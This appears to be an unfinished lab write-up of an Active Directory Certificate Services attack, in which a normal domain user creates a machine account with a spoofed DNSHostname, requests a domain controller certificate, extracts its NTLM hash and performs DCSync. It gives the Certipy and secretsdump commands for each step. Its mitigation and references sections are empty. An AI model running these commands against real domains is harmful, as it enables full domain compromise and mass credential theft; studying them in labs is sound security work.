# Outline
- The Attack In Brief
- The Tools Needed
- Lab Setup And Conditions
- Demonstrating The Attack
- Technical Breakdown
- Mitigation
- References and Credits

# The Attack In Brief
1. By default, A regular AD user can add up to 10 computers to the domain.
2. After a user adds a computer to the domain, he gains the right to change its `DNSHostname` property.
3. By changing this property to be a domain controller's `DNSHostname`, he can request a certificate for it from ADCS.
4. Using the domain controller's certificate, we can obtain its NTLM hash.
5. And with that, we can request a complete copy of the domain hashes a.k.a perform a **DCSync** attack.

---

# The Needed Tools
1. Certipy (https://github.com/ly4k/Certipy)
2. Impacket (https://github.com/SecureAuthCorp/impacket)

---

# Lab Setup And Conditions
## 1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]
![dc-with-adcs-installed](dc-with-adcs-installed.jpg)

## 2. Kali [192.168.145.128]
![kali-machine](kali-machine.jpg)

## 3. Normal User Account (No Special Privileges)
![normal-ad-user](normal-ad-user.jpg)

---

# Demonstrating The Attack
## 1. Joining A Machine Account to The Domain with A Spoofed `DNSHostname`
Command: `certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>`

![creating-computer-with-spoofed-dns-hostname](creating-computer-with-spoofed-dns-hostname.jpg)

![proof-of-dns-hostname-spoofing](proof-of-dns-hostname-spoofing.jpg)

## 2. Requesting A Domain Controller's Certificate
we must first know the certificate authority's name.

This can be done by visiting the `/certsrv` web directory on the server with ADCS installed and authenticating:

![finding-out-the-ca-name](finding-out-the-ca-name.jpg)

Command: `certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine`
Password = same password generated from the computer creation in the previous step

![requesting-dc-cert](requesting-dc-cert.jpg)

## 3. Using the Domain Controller's Certificate To Get its NTLM Hash
Command: `certipy auth -pfx <GENERATED_PFX_CERTIFICATE>`

![got-nt-hash-for-dc](got-nt-hash-for-dc.jpg)

## 4. Performing `DCsync` As The Impersonated Domain Controller
Command: `secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>`

![dc-sync-with-dc-ntlm-hash](dc-sync-with-dc-ntlm-hash.jpg)

---

# Technical Breakdown
## Center Puzzle Piece: Certificates Can Be Used For Authentication in AD


## Puzzle Piece #1: The Default Privileges Of A Normal AD User
In Active Directory, any member of the `Authenticated Users` group is allowed to add up to 10 computers to the domain.

We can verify that by going to `MMC -> ADSI EDIT > DEFAULT NAMING CONTEXT > DOMAIN PROPERTIES`

![machine-account-quota](machine-account-quota.jpg)

## Puzzle Piece #2: The Permissions an AD User Has on The Computer He Joins to the domain
When a user adds a computer to the domain, he gains a few permissions on it:

![permissions-of-computer-owner](permissions-of-computer-owner.jpg)

## Puzzle Piece #3: the permissions for the computer certificate template
The computer certificate is accessible to any computer in the Domain Computers Group:

![computer-certificate-template-permissions](computer-certificate-template-permissions.jpg)

4. requesting certs
5. grabbing the NTLM hash

# mitigation

# references and credits